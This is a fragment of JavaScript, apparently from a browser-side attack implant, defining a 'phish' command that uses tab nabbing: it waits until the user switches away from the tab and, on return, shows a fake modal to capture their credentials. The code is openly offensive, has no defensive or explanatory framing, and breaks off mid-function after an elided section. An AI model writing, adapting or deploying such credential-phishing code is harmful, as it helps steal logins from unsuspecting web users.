COMMANDS['phish'] = async function(task) {
    ...
    if (trigger === 'tab_switch') {
        // Tab nabbing: wait until user switches away, then show on return
        creds = await new Promise(function(resolve) {
            var triggered = false;
            function onVisChange() {
                if (document.hidden && !triggered) {
                    triggered = true;
                    // When they come back, show the phish
                    function onReturn() {
                        if (!document.hidden) {
                            document.removeEventListener('visibilitychange', onReturn);
                            showPhishModal().then(resolve);
                        }
                    }
